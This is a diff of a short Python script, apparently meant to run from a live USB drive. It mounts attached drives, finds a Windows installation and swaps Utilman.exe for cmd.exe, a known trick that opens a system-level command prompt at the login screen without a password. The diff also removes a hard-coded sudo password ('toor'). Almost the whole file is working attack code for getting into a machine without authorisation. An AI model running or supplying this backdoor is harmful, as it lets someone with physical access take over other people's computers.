@@ -4,7 +4,7 @@ import sys
 import os
 
 os.system('lsblk > result.txt')
-os.system('echo %s|sudo -S %s' % ('toor', 'mkdir /media/Windows'))
+os.system('mkdir /media/Windows')
 
 
 def parse(file_name):
@@ -20,7 +20,7 @@ def parse(file_name):
 
 def look_for_windows(list):
     for drive in drives_list:
-        os.system('echo %s|sudo -S mount /dev/%s' % ('toor', drive))
+        os.system('mount /dev/%s' % (drive))
         print('Checking for Windows on '+drive+'...\n')
         if os.path.isdir('/media/Windows/Windows'):
             print('Found Windows in '+drive+' and mounted it at /media/Windows')
@@ -30,8 +30,10 @@ def look_for_windows(list):
 
 drives_list = parse("result.txt")
 if look_for_windows(drives_list):
-    os.system('echo %s|sudo -S mv /media/Windows/Windows/System32/Utilman.exe /media/Windows/Windows/System32/Utilman.bak')
-    os.system('echo %s|sudo -S mv /media/Windows/Windows/System32/cmd.exe /media/Windows/Windows/System32/Utilman.exe')
+    os.system(
+        'mv /media/Windows/Windows/System32/Utilman.exe /media/Windows/Windows/System32/Utilman.bak')
+    os.system(
+        'mv /media/Windows/Windows/System32/cmd.exe /media/Windows/Windows/System32/Utilman.exe')
     print('cmd.exe modified. Rebooting now')
 else:
     print('no windows found on this machine, don\'t forget to take out the flash drive')
